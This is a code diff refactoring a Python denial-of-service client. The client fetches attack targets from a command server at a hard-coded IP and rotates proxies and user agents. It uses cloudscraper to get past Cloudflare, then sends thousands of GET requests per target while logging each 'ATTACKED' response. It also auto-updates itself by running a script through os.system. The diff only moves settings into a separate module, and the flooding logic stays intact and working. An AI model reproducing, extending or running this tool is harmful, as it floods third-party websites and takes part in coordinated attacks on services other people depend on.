@@ -1,7 +1,7 @@
 import json
 import os
 import platform
-import sys
+
 from argparse import ArgumentParser
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from gc import collect
@@ -18,12 +18,8 @@ from pyuseragents import random as random_useragent
 from requests.exceptions import ConnectionError
 from urllib3 import disable_warnings
 
-VERSION = 7
-HOSTS = ["http://65.108.20.65"]
-MAX_REQUESTS = 5000
-SUPPORTED_PLATFORMS = {
-    'linux': 'Linux'
-}
+import settings
+
 
 disable_warnings()
 
@@ -36,7 +32,7 @@ def clear():
 
 
 parser = ArgumentParser()
-parser.add_argument('threads', nargs='?', default=500)
+parser.add_argument('threads', nargs='?', default=settings.DEFAULT_THREADS)
 parser.add_argument("-n", "--no-clear", dest="no_clear", action='store_true')
 parser.add_argument("-p", "--proxy-view", dest="proxy_view", action='store_true')
 parser.add_argument("-t", "--targets", dest="targets", nargs='+', default=[])
@@ -75,15 +71,14 @@ def checkReq():
 def checkUpdate():
     logger.info("Checking Updates...")
     updateScraper = cloudscraper.create_scraper(
-        browser={'browser': 'firefox', 'platform': 'android', 'mobile': True},)
-    url = "https://gist.githubusercontent.com/AlexTrushkovsky/041d6e2ee27472a69abcb1b2bf90ed4d/raw/nowarversion.json"
+        browser=settings.BROWSER,)
     try:
-        content = updateScraper.get(url).content
+        content = updateScraper.get(settings.UPDATE_URL).content
         if content:
             data = json.loads(content)
             new_version = data["version"]
             logger.info("Version: ", new_version)
-            if int(new_version) > int(VERSION):
+            if int(new_version) > int(settings.VERSION):
                 logger.info("New version Available")
                 os.system("python updater.py " + str(threads))
                 os.system("python3 updater.py " + str(threads))
@@ -99,17 +94,17 @@ def checkUpdate():
 def mainth():
     result = 'processing'
     scraper = cloudscraper.create_scraper(
-        browser={'browser': 'firefox', 'platform': 'android', 'mobile': True},)
+        browser=settings.BROWSER,)
     scraper.headers.update({'Content-Type': 'application/json', 'cf-visitor': 'https', 'User-Agent': random_useragent(), 'Connection': 'keep-alive',
                            'Accept': 'application/json, text/plain, */*', 'Accept-Language': 'ru', 'x-forwarded-proto': 'https', 'Accept-Encoding': 'gzip, deflate, br'})
 
     while True:
         scraper = cloudscraper.create_scraper(
-            browser={'browser': 'firefox', 'platform': 'android', 'mobile': True},)
+            browser=settings.BROWSER,)
         scraper.headers.update({'Content-Type': 'application/json', 'cf-visitor': 'https', 'User-Agent': random_useragent(), 'Connection': 'keep-alive',
                                'Accept': 'application/json, text/plain, */*', 'Accept-Language': 'ru', 'x-forwarded-proto': 'https', 'Accept-Encoding': 'gzip, deflate, br'})
         logger.info("GET RESOURCES FOR ATTACK")
-        host = choice(HOSTS)
+        host = choice(settings.HOSTS)
         content = scraper.get(host).content
         if content:
             try:
@@ -146,13 +141,13 @@ def mainth():
                         {'http': f'{proxy["ip"]}://{proxy["auth"]}', 'https': f'{proxy["ip"]}://{proxy["auth"]}'})
                     response = scraper.get(site)
                     if response.status_code >= 200 and response.status_code <= 302:
-                        for i in range(MAX_REQUESTS):
+                        for i in range(settings.MAX_REQUESTS):
                             response = scraper.get(site, timeout=10)
                             attacks_number += 1
                             logger.info("ATTACKED; RESPONSE CODE: " +
                                         str(response.status_code))
             else:
-                for i in range(MAX_REQUESTS):
+                for i in range(settings.MAX_REQUESTS):
                     response = scraper.get(site, timeout=10)
                     attacks_number += 1
                     logger.info("ATTACKED; RESPONSE CODE: " +
